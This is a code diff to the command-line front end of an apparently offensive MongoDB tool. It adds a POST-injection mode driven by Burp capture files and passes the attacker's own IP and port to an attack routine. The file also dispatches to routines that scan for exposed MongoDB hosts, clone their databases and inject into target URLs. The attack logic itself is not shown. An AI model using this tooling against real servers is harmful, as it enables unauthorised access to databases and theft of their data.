@@ -1,12 +1,20 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 # __author__: sixwhale
-from Mode.scan import scanMongoIP
-from Mode.inject import InjectOption
-from Mode.attack import mgAttack, cloneDB
-from globalvalue import GlobalValue
 import getopt
 import sys
+from colorama import Back
+from colorama import Fore
+from colorama import init
+from colorama import Style
+init(autoreset=True)
+from Lib.common import printErrMsg
+from Lib.setting import MY_IP
+from Lib.setting import MY_PORT
+from Mode.attack import mgAttack
+from Mode.inject import InjectOption
+from Mode.scan import scanMongoIP
+
 
 def _cover():
     '''使用方法'''
@@ -16,7 +24,7 @@ def _cover():
 | |\/| |/ _ \| '_ \ / _` |/ _ \ / _ \| __| __/ _` |/ __| |/ /
 | |  | | (_) | | | | (_| | (_) / ___ \ |_| || (_| | (__|   <
 |_|  |_|\___/|_| |_|\__, |\___/_/   \_\__|\__\__,_|\___|_|\_\  Author: sixwhale
-                    |___/                                      Version: 1.0.1
+                    |___/                                      Version: 1.0.2
     '''
 
 def _usage():
@@ -34,7 +42,8 @@ def _usage():
                 -c <dbname>               指定数据库复制
 
     --inject                              url inject mode
-                -u <url>                  [必选参数] 指定目标url 进行注入攻击
+                -u <url>                  指定目标url 进行GET型注入攻击
+                -r <filename>             burp抓包文本 进行POST型注入攻击
     '''
 
 def mongoAttack(port):
@@ -50,18 +59,22 @@ def mongoAttack(port):
             port = int(a)
         elif o == '-c':
             clone_info = [1,a]
-    mgAttack(ip,port,GlobalValue.myip,GlobalValue.myport,clone_info)
+    mgAttack(ip,port,MY_IP,MY_PORT,clone_info)
 
 def urlInject():
     optlist,args = getopt.getopt(
         sys.argv[2:],
-        'u:'
+        'u:r:'
     )
     for o,a in optlist:
         if o == '-u':
             url = a
-    print url 
-    InjectOption(url)
+            reqFile = None
+        elif o == '-r':
+            url = None
+            reqFile = a
+
+    InjectOption(url, reqFile)
 
 
 def scanIP(scanNum):
@@ -102,9 +115,8 @@ if __name__ == '__main__':
                 _cover()
                 _usage()
                 exit()
-    except:
-        _cover()
-        _usage()
+    except Exception, e:
+        printErrMsg(e)
     if len(sys.argv) < 2:
         _cover()
         _usage()
